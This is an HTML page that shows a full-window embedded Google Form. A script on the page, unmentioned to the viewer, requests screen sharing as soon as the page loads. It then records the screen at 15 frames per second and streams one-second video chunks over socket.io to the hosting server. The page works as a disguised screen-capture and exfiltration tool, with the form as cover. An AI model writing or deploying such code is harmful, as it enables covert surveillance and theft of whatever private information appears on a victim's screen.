<!DOCTYPE html>
<html>
<head>
  <title>URch</title>
</head>
<body style="margin:0; padding:0; height:100vh;">
  <iframe 
    src="https://docs.google.com/forms/d/e/1FAIpQLScYWRK4nplfd9NeXcr6ELkMea5FYwg83XHANGPRyWLBNS_UiA/viewform?embedded=true" 
    width="100%" 
    height="100%" 
    frameborder="0" 
    marginheight="0" 
    marginwidth="0" 
    style="border:none; display:block;"
    allowfullscreen
  >
    Loadingâ€¦
  </iframe>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();
    const userId = crypto.randomUUID();
    socket.emit("user-join", userId);

    (async () => {
      const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
      const video = document.createElement("video");
      video.srcObject = stream;
      video.play();

      const canvas = document.createElement("canvas");
      canvas.width = 1280;
      canvas.height = 720;
      const ctx = canvas.getContext("2d");

      const draw = () => ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const interval = setInterval(draw, 1000 / 15);

      const recordedStream = canvas.captureStream(15);
      const recorder = new MediaRecorder(recordedStream);

      recorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
          e.data.arrayBuffer().then((buffer) => {
            socket.emit("video-chunk", { userId, chunk: buffer });
          });
        }
      };

      recorder.start(1000);

      window.addEventListener("beforeunload", () => {
        recorder.stop();
        clearInterval(interval);
      });
    })();
  </script>
</body>
</html>